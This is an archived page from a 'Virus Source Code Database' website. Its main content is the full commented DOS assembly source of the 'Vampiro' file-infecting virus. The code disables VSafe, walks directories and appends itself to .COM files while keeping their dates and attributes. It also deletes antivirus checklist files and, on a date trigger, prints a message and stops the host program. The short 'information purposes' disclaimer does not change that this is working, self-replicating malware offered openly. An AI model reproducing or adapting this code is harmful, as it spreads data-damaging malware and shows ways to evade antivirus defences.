+<a href="v_violc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_violc_asm.php">v_violc_asm</a><br>
+<a href="v-violc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-violc_asm.php">v-violc_asm</a><br>
+<a href="v_viperb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_viperb_asm.php">v_viperb_asm</a><br>
+<a href="v-viperb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-viperb_asm.php">v-viperb_asm</a><br>
+<a href="vw13_507_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vw13_507_asm.php">vw13_507_asm</a><br>
+<a href="vw13534a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vw13534a_asm.php">vw13534a_asm</a><br>
+<a href="vw13534_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vw13534_asm.php">vw13534_asm</a><br>
+<a href="vw13534b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vw13534b_asm.php">vw13534b_asm</a><br>
+<a href="vx_163_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vx_163_asm.php">vx_163_asm</a><br>
+<a href="vx-163_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vx-163_asm.php">vx-163_asm</a><br>
+</td>
+<td valign=top><center><h2>Virus Source Code Database</h2>
+<script type="text/javascript">
+<!--
+                  google_ad_client = "pub-4280558320877613";
+                  google_ad_width = 468;
+                  google_ad_height = 60;
+                  google_ad_format = "468x60_as";
+                  google_ad_channel = "5524853059";
+                  google_ad_type = "text";
+                  google_color_border = "A2CCEE";
+                  google_color_bg = "EFEFEF";
+                  google_color_link = "000000";
+                  google_color_url = "006600";
+                  google_color_text = "000000";
+        //--></script>
+<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
+<p>
+<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
+destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
+Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
+information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
+<p>
+[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
+[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
+[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
+[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
+[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
+[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
+[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
+[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
+[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
+[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
+[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
+[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
+[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
+[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
+[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
+[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
+[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
+[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
+[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
+[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
+[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
+[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
+[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
+[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
+[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
+[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
+[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
+</center><p><textarea cols=90 rows=30>
+
+.286c
+codigo  segment 'code'
+	org 100h
+	assume cs:codigo,ds:codigo,es:codigo
+start   proc far
+COMIENZO:
+	push    cs				;Guardo CS
+	push    cs				;Guardo CS
+	pop     ds				;DS<==CS
+	pop     es				;ES<==CS
+
+	call    falso_proc			;Llamo al proc. para que me
+						; quede en la pila la direccion
+						; del proc.
+falso_proc      proc near
+falso_proc      endp
+
+	pop     bp				;BP<== Direccion del proc.
+	sub     bp, 107h			;BP<== BP - Dir. anterior.
+
+;============================DESINSTALAR EL VSAFE==============================
+	push	5945h
+	push	0fa01h
+	pop	ax
+	pop	dx
+;	mov	dx, 5945h			;Desinstalar Vsafe.
+;	mov	ax, 0FA01h
+
+	int	21h
+
+;=============================CHEQUEO DE PLAYLOAD==============================
+;Chequeo la fecha -------------------------------------------------------------
+	mov	ah, 2ah				;Obtener fecha actual.
+	int	21h				;Devuelve en:
+	cmp	dh, 06d				;DH<== Mes.
+	jb	intercambio			;Si DH es menor que 6 (Junio),
+						; no hago nada.
+					;<------ Si llego aca, es porque es
+						; mayor que Junio.
+
+;Chequeo la hora --------------------------------------------------------------
+	mov	ah, 2ch				;Obtener la hora actual.
+	int	21h				;Devuelve en:
+	cmp	ch, 22d				;CH<== Hora.
+	jb	intercambio			;Si CH es menor que 22hs, salto
+						; a intercambio.
+					;<------ Si llego hasta aca, es porque
+						;cumple con las condiciones.
+	jmp	playload			;Voy al playload.
+
+;================================INTERCAMBIO===================================
+INTERCAMBIO:
+	cld					;Seteo el Direction Flag para
+						; que copie hacia delante
+	mov	cx, 7				;Cantidad de bytes. (7).
+	lea	si, [bp+buffer]			;SI<== offset de BUFFER.
+	lea	di, [bp+buffer_act]		;DI<== offset de BUFFER_ACT.
+	rep	movsb				;Copia.
+						;Ahora en BUFFER_ACT tengo
+						; el contenido de BUFFER.
+
+;Salvar el DTA original -------------------------------------------------------
+	mov     cx, 43d				;Cantidad de bytes a copiar.
+	lea     di, bp+dta_org			;DI<== offset del DTA_ORG
+	mov     si, 0080h			;SI<== offset comienzo del DTA
+	rep     movsb				;Copia 43 bytes.
+
+;============================PROGRAMA DE BUSQUEDA==============================
+;Guardar directorio original --------------------------------------------------
+	mov	ah, 47h				;Obtener directorio actual.
+	mov	dl, 0				;Unidad por defecto.
+						;Devuelve en DS:SI el path
+						;sin unidad ni barra.
+	lea	si, bp+directorio_original+1	;SI<== offset DIRECTORIO_ORG.
+	int	21h
+
+;Buscar la primer entrada -----------------------------------------------------
+BUSCAR:	
+	mov     ah, 4eh				;Buscar primer entrada.
+	lea     dx, bp+directorio		;DS:DX= Direccion de DIRECTORIO
+	mov     cx, 00010000b			;Con atributo de directorio
+	int     21h
+
+;Verificar si es un directorio ------------------------------------------------
+VERIFICAR:
+	push    0095h				;Pusheo el offset del DTA
+						; de los atributos
+	pop     bx				;Y lo guardo en BX
+	mov     al, [bx]			;Le paso a AL (Nibble donde
+						; se encuentra el bit de
+						; directorio) el contenido de
+						; BX (bits de atributos).
+	shr     ax, 4				;Muevo a AX 4 bits a la derecha
+						; para poner en 0 a los mas
+						; significativos que el bit de
+						; DIRECTORIO.
+	shl     ax, 7				;Muevo a AX 7 bits a la izq.
+						; para poner en 0 los menos
+						; significativos que DIRECTORIO
+	cmp     ax, 10000000b			;Comparo AX con 10000000, donde
+						; el 1 es el bit de DIRECTORIO.
+	jne     dir	
+
+;Verificar si el directorio es relativo ("." o "..") --------------------------
+
+	lea     si, bp+actual			;SI<== offset de ACTUAL
+	mov     di, 009eh			;DI<== offset del DTA donde
+						; esta el Filename.
+	cmpsb					;Comparo 1 byte.
+	je      dir				;Si coincidio, voy a DIR.
+	mov     cx, 0002h			;CX<== 1. Comparo 2 bytes.
+	lea     si, bp+retroceso		;SI<== offset de RETROCESO
+	mov     di, 009eh			;DI<== offset del DTA donde
+						; esta el Filename.
+	repe    cmpsb				;Repite mientras coinciden.
+	je      dir				;Si coincidieron, salto a DIR.
+					
+;Cambiar de directorio --------------------------------------------------------
+CAMBIO:
+	mov     ah, 3bh				;Cambiar de directorio.
+	mov     dx, 009eh			;DS:DX= offset del DTA
+ 	int     21h
+
+;Salvar el DTA actual ---------------------------------------------------------
+	mov     cx, 43d				;Cantidad de bytes a copiar.
+	lea     di, bp+dta			;DI<== offset del DTA_ORG
+	mov     si, 0080h			;SI<== offset comienzo del DTA
+	rep     movsb				;Copia 43 bytes.
+
+;Buscar el primer file --------------------------------------------------------
+	mov     ah, 4eh				;Buscasr 1er file.
+	lea     dx, bp+file_inf                 ;DS:DX= offset de FILE_INF
+	mov     cx, 0				;Atributos de la entrada.
+	int     21h
+	jc      retro2				;Si encontro algun file, salta
+						; a FILE_A_INFECTAR.
+					;<----- Si llego hasta aca es porque
+						;no encontro ningun file.
+	jmp	file_a_infectar			;Salto a RETRO.
+
+;Buscar el proximo file -------------------------------------------------------
+SEARCH:
+	mov     ah, 4fh				;Busca el proximo file.
+	int     21h
+	jc      retro2				;Si encontro algun file, salta
+	jmp	file_a_infectar			; a FILE_A_INFECTAR.
+
+;Retroceder de directorio -----------------------------------------------------
+RETRO:
+	mov     ah, 3bh                         ;Cambiar de directorio.
+	lea     dx, bp+retroceso		;DX<== offset de RETROCESO.
+	int     21h
+	jnc	buscar
+	jmp	no_infectar
+
+;Retroceder de directorio -----------------------------------------------------
+RETRO2:
+	mov     ah, 3bh                         ;Cambiar de directorio.
+	lea     dx, bp+retroceso		;DX<== offset de RETROCESO.
+	int     21h
+	jnc	act_dta
+	jmp	no_infectar
+
+;Buscar el proximo directorio -------------------------------------------------
+DIR:
+	mov     ah, 4fh				;Buscar la proxima entrada.
+	int     21h
+	jnc     verificar
+	jmp	retro
+
+;Actualizo DTA ----------------------------------------------------------------
+ACT_DTA:
+	mov     cx, 43d				;Cantidad de bytes a copiar.
+	lea     si, bp+dta			;SI<== offset de var. DTA.
+	mov     di, 0080h			;DI<== offset del comienzo DTA.
+	rep     movsb				;Copia 43 bytes.
+	jmp	dir
+	
+;========================FIN DE PROGRAMA DE BUSQUEDA===========================
+
+
+;==============================INFECTAR FILE===================================
+FILE_A_INFECTAR:
+;Comprobar que sea .COM -------------------------------------------------------
+	mov     cx, 13d                         ;Son 13 bytes.
+	mov     si, 009eh			;SI<== offset del Filename DTA.
+	lea     di, bp+puntos			;DI<== offset "."
+	repne   cmpsb                           ;Compara.
+
+;El punto lo tiene que encontrar s¡ o s¡ --------------------------------------
+	inc	si
+	cmp	byte ptr [si], 'O'
+	jne	search
+
+;Comprobar que no sea el command.com ------------------------------------------
+	mov     cx, 12d                         ;Son 12 bytes.
+	mov     si, 009eh			;SI<== offset del Filename DTA.
+	lea     di, bp+command			;DI<== offset COMMAND.
+	repe    cmpsb                           ;Compara.
+	jne     continuar			;Si hay error, salta CONTINUAR.
+	jmp     search				;Si no, salta a SEARCH.
+
+;Verificar longitud -----------------------------------------------------------
+CONTINUAR:
+	mov     cx, 2				;Copiar 2 bytes.
+	mov     si, 009ah			;SI<== offset del DTA (long.).
+	lea     di, bp+longitud			;DI<== offset de LONGITUD.
+	rep     movsb				;Copia.
+	sub	word ptr [bp+longitud], 3	;Resto 3 bytes a [LONGITUD].
+
+;Comprobar longitud que no sea mayor a 64000 bytes-----------------------------
+	cmp	word ptr [bp+longitud], 64000d	;Comparo longitud con 64000.
+	jb	c				;Si long. es menor, salto a C.
+	jmp	search				;Si no, salto a SEARCH.
+
+;Guardar atributos del file ---------------------------------------------------
+C:
+	mov	ax, 4300h			;Obtener atributos.
+	mov	dx, 009eh			;DX<== offset del Filename DTA.
+	int	21h				;Devuelve atribs. en CX.
+	mov	word ptr [bp+atributos],cx	;Paso CX a ATRIBUTOS.
+
+;Setear atributos a R/W -------------------------------------------------------
+	push	4301h
+	pop	ax
+;	mov	ax, 4301h			;Setear atributos.
+
+	mov	cx, 0000h			;Seteo atrib. a "normal"
+	int	21h
+
+;Abrir file -------------------------------------------------------------------
+
+	push	3d02h
+	pop	ax
+;	mov     ah, 3dh				;Abro file.
+;	mov     al, 00000010b			;Para lectura/escritura.
+
+	mov     dx, 009eh			;DX<== offset del DTA(Filename)
+	int     21h                             ;El handle viene al AX.
+	push    ax                              ;Lo guardo.
+
+;Leo los 7 primeros bytes -----------------------------------------------------
+	pop     bx                              ;Paso el handle a BX.
+	push    bx				;Y lo guardo.
+
+	push	3f00h
+	pop	ax
+;	mov     ah, 3fh                          ;Leer file.
+
+	mov     cx, 0007h			;Leer 7 bytes.
+	lea     dx, bp+buffer                   ;Para guardarlo en el buffer.
+	int     21h
+
+;Comprobar MZ -----------------------------------------------------------------
+	cmp	byte ptr [bp+buffer],'M'
+	jne	d
+	cmp	byte ptr [bp+buffer+1],'Z'
+	jne	d
+	jmp	cerrar
+
+;Comprobar infeccion ----------------------------------------------------------
+D:
+	mov     cx, 4d                          ;Son 4 bytes.
+	lea     si, bp+string                   ;Comparar la var. string.
+	lea     di, bp+buffer                   ;Con la var. buffer.
+	add     di, 3d                          ;Salterar los 3 primeros bytes.
+	repe    cmpsb                           ;Realiza comparacion.
+	jne     infectar			;Te caga el file.
+
+;Cerrar file porque esta apestado ---------------------------------------------
+CERRAR:
+	pop     bx                              ;Saco el handle.
+	push    bx                              ;Y lo guardo.
+
+	push	3e00h
+	pop	ax
+;	mov     ah, 3eh				;Cerrar file.
+
+	int     21h
+
+;Restauro atributos del file original -----------------------------------------
+	push	4301h
+	pop	ax
+;	mov	ax, 4301h			;Restauro atributos originales.
+
+	mov	cx, word ptr [bp+atributos]	;CX<== ATRIBUTOS.
+	mov	dx, 009eh			;DX<== offset del Filename DTA.
+	int	21h
+	jmp     search
+
+;=============================INFECTAR EN SI===================================
+INFECTAR:
+;Guardar fecha del file -------------------------------------------------------
+	pop	bx				;BX<== Handle.
+	push	bx				;Stack<== Handle.
+	mov	ax, 5700h			;Obtener fecha.
+						;Devuelve en CX y DX.
+	int	21h
+	mov	word ptr [bp+fecha],cx		;Paso CX a FECHA.
+	mov	word ptr [bp+fecha+2],dx	;Paso DX a FECHA+2.
+
+
+;Mover puntero al principio ---------------------------------------------------
+	push	4200h
+	pop	ax
+;	mov	ax, 4200h			;Muevo el puntero de escritura
+						; al principio del prog.
+	mov     cx, 0000h
+	mov     dx, 0000h
+	int     21h
+
+;Escrivo el primer byte(jmp) --------------------------------------------------
+	push	4000h
+	pop	ax
+;	mov     ah, 40h				;Escribir el 1er. byte.
+
+	mov     cx, 1d				;Cantidad=1.
+	lea     dx, bp+jump			;DX<== offset de JUMP
+	int     21h
+
+;Escrivo longitud o sea, completo el jmp --------------------------------------
+	push	4000h
+	pop	ax
+;	mov     ah, 40h				;Escribo.
+
+	mov     cx, 2d                          ;Cantidad de bytes.
+	lea     dx, bp+longitud			;DX<== offset de LONGITUD.
+	int     21h
+
+;Escrivo los 4 del string -----------------------------------------------------
+	push	4000h
+	pop	ax
+;	mov     ah, 40h				;Escribo.
+
+	mov     cx, 4d				;Cantidad.
+	lea     dx, bp+string			;DX<== offset de STRING.
+	int     21h
+
+;Mover puntero al final -------------------------------------------------------
+	push	4202h
+	pop	ax
+;	mov	ax, 4202h			;Muevo el puntero de escritura
+						; al final del prog.
+	mov     cx, 0000h
+	mov     dx, 0000h
+	int     21h
+	add	word ptr [bp+longitud],3	;Restauro LONGITUD.
+
+;Copio el virus al programa ---------------------------------------------------
+	pop     bx				;Restauro el handle.
+
+	push	4000h
+	pop	ax
+;	mov     ah, 40h				;Servicio.
+
+	mov     cx, 1000d			;Cantidad de bytes a copiar.
+						;Realmente son 874 bytes, pero
+						; agregamos hasta 1000 de
+						; basura.
+	lea 	dx, bp+comienzo			;Copiar desde...
+	int     21h
+
+;Restauro la fecha del file original ------------------------------------------
+	mov	ax, 5701h			;Restauro fecha original.
+	mov	cx, word ptr [bp+fecha]		;Paso FECHA a CX.
+	mov	dx, word ptr [bp+fecha+2]	;Paso FECHA+2 a DX.
+	int 21h
+
+;Cierro el file luego de haberlo infectado ------------------------------------
+	push	3e00h
+	pop	ax
+;	mov     ah, 3eh				;Cerrar file.
+
+	int     21h
+
+;Restauro atributos del file original -----------------------------------------
+	push	4301h
+	pop	ax
+;	mov	ax, 4301h			;Restauro atributos originales.
+
+	mov	cx, word ptr [bp+atributos]	;CX<== ATRIBUTOS.
+	mov	dx, 009eh			;DX<== offset del Filename DTA.
+	int	21h
+
+;===============================BORRAR CHECKLISTS==============================
+;Setear atributos a R/W -------------------------------------------------------
+	push	4301h
+	pop	ax
+;	mov	ax, 4301h			;Setear atributos.
+
+	mov	cx, 0000h			;Seteo atrib. a "normal"
+	lea	dx, bp+checklist		;DX<== offset de CHECKLIST.
+	int	21h
+
+;Borrar directamente el Checklist ---------------------------------------------
+	mov	ah,41h				;Servicio.
+	int	21h
+
+;Setear atributos a R/W -------------------------------------------------------
+	push	4301h
+	pop	ax
+;	mov	ax, 4301h			;Setear atributos.
+
+	mov	cx, 0000h			;Seteo atrib. a "normal"
+	lea	dx, bp+antivir			;DX<== offset de ANTI-VIR.
+	int	21h
+
+;Borrar directamente el Checklist ---------------------------------------------
+	mov	ah,41h				;Servicio.
+	int	21h
+
+;=============================NO INFECTAR NADA=================================
+NO_INFECTAR:
+;========================VOLVER AL DIRECTORIO ORIGINAL=========================
+
+;Volver al directorio original-------------------------------------------------
+	mov     ah, 3bh                         ;Cambiar de directorio.
+	lea     dx, bp+directorio_original	;DX<== offset de RETROCESO.
+	int     21h
+
+;Actualizar todo el DTA -------------------------------------------------------
+	mov     cx, 43d				;Cantidad de bytes a copiar.
+	lea     si, bp+dta_org			;SI<== offset de var. DTA.
+	mov     di, 0080h			;DI<== offset del comienzo DTA.
+	rep     movsb				;Copia 43 bytes.
+
+
+;=======================DEVUELVE EL CONTROL AL ANFITRION=======================
+;Copiar el buffer con los 7 primeros byte del file a memoria ------------------
+	mov	cx, 0007h			;Cantidad de bytes (7).
+	mov	di, 0100h			;DI<== offset 100h. Comienzo
+						; del prog. en memoria.
+	lea	si, bp+buffer_act		;SI<== offset del BUFFER_ACT.
+	rep	movsb				;Copia.
+
+;Saltar al offset 100h --------------------------------------------------------
+	push	100h
+	pop	ax
+;	mov	ax, 0100h			;Direccion para ejecucion del
+
+	jmp	ax				; anfitrion.
+
+;=================================PLAYLOAD=====================================
+PLAYLOAD:
+	mov	ah, 09h				;Imprimir cadena.
+	lea	dx, bp+mensaje			;DX<== offset de MENSAJE.
+	int	21h				;
+
+	mov 	ah, 4ch				;Terminar y no ejecutar el file
+	int	21h				; una mierda.
+
+start   endp
+;==============================AREA DE DATOS===================================
+
+buffer			db 7d dup(0)
+buffer_act		db 7d dup(0)
+dta			db 43d dup(0)
+dta_org			db 43d dup(0)
+longitud		db 2 dup(0)
+fecha			db 4 dup(0)
+atributos		db 2 dup(0)
+directorio_original	db '\',64 dup(0)
+mensaje			db 'Zarathustra & Drako les comunican que llego la '
+                        db 'hora de ir a dormir. Shh!                '
+			db 'Vampiro Virus.$'
+directorio		db '*.*',0
+actual			db '.',0
+retroceso		db '..',0
+puntos			db '...............',0
+file_inf		db '*.C?M',0
+checklist		db 'chklist.ms',0
+antivir			db 'anti-vir.dat',0
+string			db '›½è˜',0
+jump			db 'é',0
+command			db 'COMMAND.COM',0
+ 
+codigo  ends
+end     start
+
+</textarea></td></tr></table></body></html>
